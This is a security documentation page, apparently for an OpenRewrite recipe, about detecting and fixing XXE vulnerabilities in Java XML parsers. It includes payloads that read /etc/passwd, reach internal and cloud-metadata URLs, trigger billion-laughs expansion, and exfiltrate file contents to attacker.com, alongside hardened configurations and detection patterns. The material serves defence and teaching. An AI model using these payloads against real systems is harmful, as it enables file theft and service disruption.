---
description: Detect and prevent XML External Entity (XXE) vulnerabilities in XML processing.
---

# XXE Vulnerability Detection

XML External Entity (XXE) vulnerabilities occur when XML parsers process untrusted XML input containing external entity references. Attackers can exploit XXE to read local files, perform server-side request forgery (SSRF), cause denial of service, or even achieve remote code execution in some cases.

## Understanding XXE Vulnerabilities

Think of XML entities like variables in programming. External entities are like variables that fetch their values from outside sources - files, URLs, or system resources. XXE attacks trick your application into fetching and exposing content it shouldn't access, like asking a librarian to fetch a book but secretly including instructions to also bring the library's financial records.

### How XXE Works

```xml
<!-- Normal XML -->
<?xml version="1.0"?>
<user>
    <name>John Doe</name>
</user>

<!-- XXE Attack - File Disclosure -->
<?xml version="1.0"?>
<!DOCTYPE user [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
    <name>&xxe;</name>
</user>

<!-- The parser replaces &xxe; with contents of /etc/passwd -->
```

## How OpenRewrite Detects XXE

The `FindXxeVulnerability` recipe identifies unsafe XML parser configurations:

### 1. Vulnerable XML APIs

```java
// DOM Parser
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
DocumentBuilder db = dbf.newDocumentBuilder();
db.parse(xmlInput);  // VULNERABLE if not configured safely

// SAX Parser
SAXParserFactory spf = SAXParserFactory.newInstance();
SAXParser parser = spf.newSAXParser();
parser.parse(xmlInput, handler);  // VULNERABLE

// StAX Parser
XMLInputFactory xif = XMLInputFactory.newInstance();
XMLStreamReader reader = xif.createXMLStreamReader(xmlInput);  // VULNERABLE

// JAXB
JAXBContext jc = JAXBContext.newInstance(User.class);
Unmarshaller u = jc.createUnmarshaller();
u.unmarshal(xmlInput);  // VULNERABLE

// Other vulnerable APIs
TransformerFactory.newInstance()
Schema.newValidator()
SAXReader (dom4j)
```

### 2. Attack Vectors

```xml
<!-- File Disclosure -->
<!ENTITY xxe SYSTEM "file:///etc/passwd">
<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">

<!-- SSRF (Server-Side Request Forgery) -->
<!ENTITY xxe SYSTEM "http://internal-server:8080/admin">
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">

<!-- Denial of Service (Billion Laughs) -->
<!ENTITY lol "lol">
<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">

<!-- Data Exfiltration -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;
```

## Vulnerable Patterns

### Basic XXE Vulnerability

```java
// VULNERABLE - Default parser configuration
@PostMapping("/user")
public User parseUser(String xmlData) throws Exception {
    DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
    DocumentBuilder db = dbf.newDocumentBuilder();
    Document doc = db.parse(new InputSource(new StringReader(xmlData)));
    
    String name = doc.getElementsByTagName("name").item(0).getTextContent();
    return new User(name);
}
// Attack: XML with <!ENTITY xxe SYSTEM "file:///etc/passwd">
// Returns: User with name containing password file contents!
```

### JAXB Unmarshalling

```java
// VULNERABLE - JAXB with external entities
@PostMapping("/import")
public Response importData(@RequestBody String xml) {
    try {
        JAXBContext context = JAXBContext.newInstance(ImportData.class);
        Unmarshaller unmarshaller = context.createUnmarshaller();
        
        StringReader reader = new StringReader(xml);
        ImportData data = (ImportData) unmarshaller.unmarshal(reader);
        
        return Response.ok(data).build();
    } catch (Exception e) {
        return Response.serverError().build();
    }
}
```

### SAX Parser Vulnerability

```java
// VULNERABLE - SAX parser without security features
@GetMapping("/parse")
public void parseXML(InputStream xmlStream) throws Exception {
    SAXParserFactory factory = SAXParserFactory.newInstance();
    SAXParser parser = factory.newSAXParser();
    
    DefaultHandler handler = new DefaultHandler() {
        public void characters(char[] ch, int start, int length) {
            System.out.println(new String(ch, start, length));
        }
    };
    
    parser.parse(xmlStream, handler);
}
```

### XPath Injection with XXE

```java
// VULNERABLE - XPath evaluation on untrusted XML
@PostMapping("/search")
public List<String> searchXML(String xml, String xpath) throws Exception {
    DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
    Document doc = dbf.newDocumentBuilder().parse(
        new InputSource(new StringReader(xml))
    );
    
    XPath xPath = XPathFactory.newInstance().newXPath();
    NodeList nodes = (NodeList) xPath.evaluate(xpath, doc, XPathConstants.NODESET);
    
    List<String> results = new ArrayList<>();
    for (int i = 0; i < nodes.getLength(); i++) {
        results.add(nodes.item(i).getTextContent());
    }
    return results;
}
```

## Safe Patterns and Remediation

### Disable External Entities - DOM

```java
// SAFE - Properly configured DOM parser
public Document parseXMLSafely(String xml) throws Exception {
    DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
    
    // Disable DTDs entirely
    dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
    
    // Or disable external entities while allowing DTDs
    dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
    dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
    dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
    
    // Disable XInclude
    dbf.setXIncludeAware(false);
    
    // Disable expansion of entity references
    dbf.setExpandEntityReferences(false);
    
    DocumentBuilder db = dbf.newDocumentBuilder();
    return db.parse(new InputSource(new StringReader(xml)));
}
```

### Disable External Entities - SAX

```java
// SAFE - Secured SAX parser
public void parseSAXSafely(InputStream xml) throws Exception {
    SAXParserFactory spf = SAXParserFactory.newInstance();
    
    // Disable DTDs
    spf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
    
    // Disable external entities
    spf.setFeature("http://xml.org/sax/features/external-general-entities", false);
    spf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
    spf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
    
    SAXParser parser = spf.newSAXParser();
    parser.parse(xml, new DefaultHandler());
}
```

### Disable External Entities - StAX

```java
// SAFE - Secured StAX parser
public void parseStAXSafely(InputStream xml) throws Exception {
    XMLInputFactory xif = XMLInputFactory.newInstance();
    
    // Disable DTDs and external entities
    xif.setProperty(XMLInputFactory.SUPPORT_DTD, false);
    xif.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false);
    
    XMLStreamReader reader = xif.createXMLStreamReader(xml);
    while (reader.hasNext()) {
        reader.next();
        // Process XML
    }
}
```

### Secure JAXB Configuration

```java
// SAFE - JAXB with secure unmarshalling
@Component
public class SecureXMLProcessor {
    
    public <T> T unmarshalSafely(String xml, Class<T> clazz) throws Exception {
        JAXBContext context = JAXBContext.newInstance(clazz);
        Unmarshaller unmarshaller = context.createUnmarshaller();
        
        // Create secure SAX source
        SAXParserFactory spf = SAXParserFactory.newInstance();
        spf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
        spf.setFeature("http://xml.org/sax/features/external-general-entities", false);
        spf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
        
        XMLReader xmlReader = spf.newSAXParser().getXMLReader();
        SAXSource source = new SAXSource(xmlReader, new InputSource(new StringReader(xml)));
        
        return (T) unmarshaller.unmarshal(source);
    }
}
```

### Central XML Security Configuration

Create a centralized XML security utility.
```java
@Component
public class XMLSecurityConfig {
    
    public DocumentBuilderFactory createSecureDocumentBuilderFactory() {
        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
        try {
            // Primary defense: completely disable DTDs
            dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
            
            // Secondary defenses if DTDs must be enabled
            dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
            dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
            dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
            
            // Prevent XInclude attacks
            dbf.setXIncludeAware(false);
            
            // Prevent entity expansion attacks
            dbf.setExpandEntityReferences(false);
            
        } catch (ParserConfigurationException e) {
            throw new RuntimeException("Failed to configure secure XML parser", e);
        }
        return dbf;
    }
    
    public SAXParserFactory createSecureSAXParserFactory() {
        SAXParserFactory spf = SAXParserFactory.newInstance();
        try {
            spf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
            spf.setFeature("http://xml.org/sax/features/external-general-entities", false);
            spf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
        } catch (Exception e) {
            throw new RuntimeException("Failed to configure secure SAX parser", e);
        }
        return spf;
    }
    
    public XMLInputFactory createSecureXMLInputFactory() {
        XMLInputFactory xif = XMLInputFactory.newInstance();
        xif.setProperty(XMLInputFactory.SUPPORT_DTD, false);
        xif.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false);
        return xif;
    }
}
```

## Advanced XXE Prevention

### Content Validation

Validate XML content before parsing.
```java
public class XMLValidator {
    private static final Pattern ENTITY_PATTERN = Pattern.compile(
        "<!ENTITY\\s+\\S+\\s+SYSTEM\\s+[\"'][^\"']+[\"']\\s*>",
        Pattern.CASE_INSENSITIVE
    );
    
    private static final Pattern DOCTYPE_PATTERN = Pattern.compile(
        "<!DOCTYPE[^>]+>",
        Pattern.CASE_INSENSITIVE | Pattern.DOTALL
    );
    
    public void validateXML(String xml) throws SecurityException {
        // Check for ENTITY declarations
        if (ENTITY_PATTERN.matcher(xml).find()) {
            throw new SecurityException("External entities not allowed");
        }
        
        // Check for DOCTYPE if not allowed
        if (DOCTYPE_PATTERN.matcher(xml).find()) {
            throw new SecurityException("DOCTYPE declarations not allowed");
        }
        
        // Check for suspicious protocols
        if (xml.contains("file://") || xml.contains("http://") || 
            xml.contains("ftp://") || xml.contains("gopher://")) {
            throw new SecurityException("External references not allowed");
        }
    }
}
```

### Schema Validation

Use XML Schema validation as additional protection.
```java
public class SchemaValidatingParser {
    private final Schema schema;
    
    public SchemaValidatingParser(String schemaPath) throws Exception {
        SchemaFactory factory = SchemaFactory.newInstance(XMLConstants.W3C_XML_SCHEMA_NS_URI);
        
        // Secure the schema factory
        factory.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, "");
        factory.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "");
        
        this.schema = factory.newSchema(new File(schemaPath));
    }
    
    public Document parseAndValidate(String xml) throws Exception {
        // Create secure parser
        DocumentBuilderFactory dbf = createSecureDBF();
        dbf.setSchema(schema);
        
        DocumentBuilder db = dbf.newDocumentBuilder();
        
        // Add error handler
        db.setErrorHandler(new ErrorHandler() {
            public void error(SAXParseException e) throws SAXException {
                throw new SAXException("Schema validation failed", e);
            }
            public void fatalError(SAXParseException e) throws SAXException {
                throw new SAXException("Fatal validation error", e);
            }
            public void warning(SAXParseException e) {
                log.warn("XML validation warning", e);
            }
        });
        
        return db.parse(new InputSource(new StringReader(xml)));
    }
}
```

### Framework-Specific Configurations

#### Spring Boot

```java
@Configuration
public class XMLConfig {
    
    @Bean
    public Jaxb2Marshaller marshaller() {
        Jaxb2Marshaller marshaller = new Jaxb2Marshaller();
        marshaller.setPackagesToScan("com.example.dto");
        
        // Disable external entities
        Map<String, Object> properties = new HashMap<>();
        properties.put("javax.xml.bind.UnmarshallerProperties.DISABLE_SECURE_PROCESSING", false);
        marshaller.setUnmarshallerProperties(properties);
        
        return marshaller;
    }
    
    @Bean
    public RestTemplate restTemplate() {
        RestTemplate restTemplate = new RestTemplate();
        
        // Configure secure XML message converter
        List<HttpMessageConverter<?>> converters = restTemplate.getMessageConverters();
        for (HttpMessageConverter<?> converter : converters) {
            if (converter instanceof MappingJackson2XmlHttpMessageConverter) {
                ((MappingJackson2XmlHttpMessageConverter) converter)
                    .getObjectMapper()
                    .configure(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES, true);
            }
        }
        
        return restTemplate;
    }
}
```

## Testing XXE Detection

### Unit Tests

```java
@Test
void detectsBasicXXE() {
    rewriteRun(
        java("""
            import javax.xml.parsers.*;
            import org.xml.sax.InputSource;
            import java.io.StringReader;
            
            class XMLParser {
                void parseXML(String xml) throws Exception {
                    DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
                    DocumentBuilder db = dbf.newDocumentBuilder();
                    ~~>db.parse(new InputSource(new StringReader(xml)));
                }
            }
            """)
    );
}

@Test
void allowsSecureParser() {
    rewriteRun(
        java("""
            import javax.xml.parsers.*;
            
            class SecureParser {
                void parseXML(String xml) throws Exception {
                    DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
                    dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
                    DocumentBuilder db = dbf.newDocumentBuilder();
                    db.parse(new InputSource(new StringReader(xml)));
                }
            }
            """)
    );
}

@Test
void detectsJAXBVulnerability() {
    rewriteRun(
        java("""
            import javax.xml.bind.*;
            import java.io.StringReader;
            
            class JAXBParser {
                void unmarshal(String xml) throws Exception {
                    JAXBContext context = JAXBContext.newInstance(User.class);
                    Unmarshaller unmarshaller = context.createUnmarshaller();
                    ~~>unmarshaller.unmarshal(new StringReader(xml));
                }
            }
            """)
    );
}
```

## Common XXE Attack Scenarios

### File Disclosure
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user><name>&xxe;</name></user>
```

### SSRF Attack
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-server/admin">
]>
<data>&xxe;</data>
```

### Denial of Service
```xml
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!-- Exponential expansion -->
]>
<lolz>&lol3;</lolz>
```

### Blind XXE (Out-of-Band)
```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>">
  %eval;
  %exfil;
]>
```

## Monitoring and Detection

### Runtime Detection

```java
@Aspect
@Component
public class XXEDetectionAspect {
    
    @Before("@annotation(XMLParsing)")
    public void detectXXE(JoinPoint joinPoint) {
        Object[] args = joinPoint.getArgs();
        for (Object arg : args) {
            if (arg instanceof String) {
                String xml = (String) arg;
                if (containsXXEIndicators(xml)) {
                    log.error("Potential XXE attack detected in XML: {}", 
                             sanitizeForLogging(xml));
                    throw new SecurityException("XXE attack detected");
                }
            }
        }
    }
    
    private boolean containsXXEIndicators(String xml) {
        return xml.contains("<!ENTITY") || 
               xml.contains("SYSTEM") || 
               xml.contains("PUBLIC") ||
               xml.contains("file://") ||
               xml.contains("http://");
    }
}
```

## Next Steps

- [SQL Injection](sql-injection.md) - Database query injection
- [Command Injection](command-injection.md) - OS command injection

:::danger High Severity
XXE vulnerabilities can lead to file disclosure, SSRF, DoS, and in some cases RCE. Always disable external entities and DTDs when processing untrusted XML. Consider using JSON instead of XML when possible.
:::
